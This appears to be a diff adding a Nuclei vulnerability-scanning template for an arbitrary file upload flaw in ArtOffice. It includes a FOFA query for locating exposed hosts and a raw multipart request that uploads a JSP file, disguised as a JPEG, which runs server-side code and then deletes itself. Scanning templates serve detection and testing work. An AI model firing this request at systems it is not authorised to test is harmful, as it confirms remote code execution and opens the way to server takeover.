@@ -1,0 +1,54 @@
+id: artoffice-fileupload
+
+info:
+  name: ArtOffice uploadfile/save - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    Artoffice has a vulnerability in uploading arbitrary files in the frontend, allowing attackers to upload arbitrary Trojan files to control server permissions
+  metadata:
+    fofa: title="ArtOffice" || icon_hash="883783005"
+    max-request: 1
+    verified: true
+  tags: ArtOffice
+
+variables:
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+
+http:
+  - raw:
+      - |
+        POST /uploadfile/save?modules=literature&category=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 323
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMBgSC3UaoRGBL0N4
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+        ------WebKitFormBoundaryMBgSC3UaoRGBL0N4
+        Content-Disposition: form-data; name="file"; filename="avator.jpg"
+        Content-Type: image/jpeg
+
+        <%out.print({{s1}}*{{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryMBgSC3UaoRGBL0N4
+        Content-Disposition: form-data; name="name"
+
+        11111111111.jsp
+        ------WebKitFormBoundaryMBgSC3UaoRGBL0N4--
+
+    extractors:
+      - type: json
+        name: filepath
+        json:
+          - ".url"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "originname", "url", "status", "uploadfiles/literature")'
+          - status_code == 200
+        condition: and
